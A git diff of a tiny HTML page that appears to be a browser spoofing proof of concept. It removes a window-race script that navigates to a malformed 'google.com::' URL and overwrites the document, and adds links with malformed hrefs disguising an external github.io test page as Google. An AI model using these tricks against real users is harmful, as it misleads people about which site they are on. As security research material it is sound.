@@ -1,42 +1,19 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta charset="windows-1252">
+</head>
 <body>
 
-<button onclick="run()">go</button>
+<a href="google.com::">11111</a>
 
-<script>
-function run() {
-  let w = window.open();
+<a href="www.google.com::/url?q=https%3A%2F%2Flowleveljody.github.io%2Fpocbrowseraja%2FBanget.html&sa=D&sntz=1&usg=AFQjCNG-QnLGG1ixIlOzlpZQn5cweSU3Cw">
+22222
+</a>
 
-  // Step 1: start with controlled content
-  w.document.write("<h1>Loading...</h1>");
-  w.document.close();
-
-  // Step 2: navigate to weird URL
-  setTimeout(() => {
-    w.location.href = "google.com::";
-  }, 50);
-
-  // Step 3: race + take back control
-  let t = setInterval(() => {
-    try {
-      // once cross-origin or error happens, this throws
-      w.location.href;
-    } catch (e) {
-      clearInterval(t);
-
-      // overwrite content again
-      try {
-        w.document.open();
-        w.document.write("<h1>nope</h1>");
-        w.document.close();
-      } catch (err) {
-        console.log("Blocked:", err);
-      }
-    }
-  }, 1);
-}
-</script>
+<a href="https://lowleveljody.github.io/pocbrowseraja/Banget.html::/test/spoof/chrome/5.html">
+33333
+</a>
 
 </body>
 </html>
